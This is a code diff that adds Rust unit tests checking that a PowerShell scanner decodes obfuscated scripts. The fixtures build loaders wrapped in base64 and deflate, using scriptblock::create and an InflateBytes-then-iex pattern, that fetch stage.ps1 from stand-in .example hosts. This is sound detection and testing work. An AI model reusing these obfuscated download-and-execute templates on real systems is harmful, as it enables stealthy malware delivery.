@@ -10626,6 +10626,33 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_nested_deflate_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let decoded = "Invoke-WebRequest -Uri https://deflate-stream.example/stage.ps1";
+        let mut encoder =
+            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let deflated = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(deflated);
+        let ps = format!(
+            "$s.Arguments='-nop -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''{b64}''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://deflate-stream.example/stage.ps1"),
+            "nested deflate payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.to_ascii_lowercase().contains("deflatestream"),
+            "deflate wrapper should be replaced by the decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_variable_gzip_function_base64() {
         use base64::Engine;
         use std::io::Write;
@@ -10660,6 +10687,46 @@ iex $stage
         assert!(
             !normalized.contains("FromBase64String($blob)"),
             "gzip function base64 call should be replaced by decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_variable_deflate_function_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let filler: String = (0..1024).map(|n| format!("{n:04x}")).collect();
+        let decoded =
+            format!("Invoke-WebRequest -Uri https://deflate-func.example/stage.ps1\r\n# {filler}");
+        let mut encoder =
+            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let deflated = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(deflated);
+        let ps = format!(
+            r#"
+$blob = "{b64}"
+function InflateBytes ([byte[]]$bytes) {{
+    $inputStream = [IO.MemoryStream]::new($bytes)
+    $deflateStream = [IO.Compression.DeflateStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
+    $outputStream = [IO.MemoryStream]::new()
+    $deflateStream.CopyTo($outputStream)
+    $outputStream.ToArray()
+}}
+$stage = [Text.Encoding]::UTF8.GetString((InflateBytes([Convert]::FromBase64String($blob)))).TrimEnd("`0")
+iex $stage
+"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://deflate-func.example/stage.ps1"),
+            "variable deflate function payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "deflate function base64 call should be replaced by decoded script:\n{}",
             normalized
         );
     }
